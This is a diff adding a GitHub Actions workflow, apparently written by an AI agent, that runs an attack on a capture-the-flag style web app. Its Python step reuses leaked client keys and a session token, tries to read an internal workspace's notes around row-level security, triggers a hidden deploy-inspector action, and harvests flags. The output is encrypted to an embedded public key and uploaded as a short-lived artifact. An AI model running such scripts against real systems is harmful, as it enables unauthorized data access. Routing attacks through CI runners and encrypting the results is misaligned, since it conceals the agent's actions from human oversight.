@@ -1,0 +1,58 @@
+name: launchlet-part3-postaction
+on:
+  push:
+    branches: [agent/launchlet-part3-postaction-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Invoke inspector then refetch visible surfaces and encrypt diffs
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,hashlib
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/';out=pathlib.Path('package/out')
+          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
+          b=s.get(base+'api/app/bootstrap',timeout=12).json(); paths=['/',b['api']['buildManifest'],b['api']['serverReferences'],b['api']['dataApiBase'].rstrip('/')+'/workspace_notes?select=*',b['api']['dataApiBase'].rstrip('/')+'/workspace_notes?select=*&workspace_id=eq.ws-launchlet-internal&workspace_id=eq.ws-launchlet-public']
+          auth={'Accept':'application/json','apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
+          before=[]
+          for p in paths:
+            h=auth if '/api/db/' in p else {};r=s.get(base+p.lstrip('/'),headers=h,timeout=10);before.append({'path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=10).json();a=refs['serverActions']['inspectDeploy']; body={'actionId':a['id'],'args':{'workspaceId':b['workspace'],'projectId':b['project']}}
+          ar=s.post(base+a['endpoint'].lstrip('/'),headers={**auth,'Content-Type':'application/json','X-Launchlet-Preview':b['project']},json=body,timeout=10); action={'status':ar.status_code,'body':ar.text,'headers':dict(ar.headers),'cookies':s.cookies.get_dict()}
+          try:ref=ar.json()['inspector']['deployRef']
+          except:ref='preview-8b11c'
+          after=[]
+          for p in paths:
+            h=auth if '/api/db/' in p else {};r=s.get(base+p.lstrip('/'),headers=h,timeout=10);after.append({'path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          # same surfaces with deployRef query after action
+          for p in ['/',b['api']['buildManifest'],b['api']['serverReferences']]:
+            sep='&' if '?' in p else '?';r=s.get(base+p.lstrip('/')+sep+'deployRef='+ref,headers={'X-Launchlet-Preview':b['project']},timeout=10);after.append({'path':p+'?deployRef='+ref,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          obj={'action':action,'ref':ref,'before':before,'after':after};(out/'summary.json').write_text(json.dumps(obj,indent=2))
+          alltxt=json.dumps(obj)
+          flags=[f for f in re.findall(r'caplag\{[^}]+\}',alltxt) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+          if flags:(out/'FOUND.txt').write_text('\n'.join(flags)+'\n'+alltxt)
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"; openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc; openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-postaction-encrypted
+          path: artifact/
+          retention-days: 1
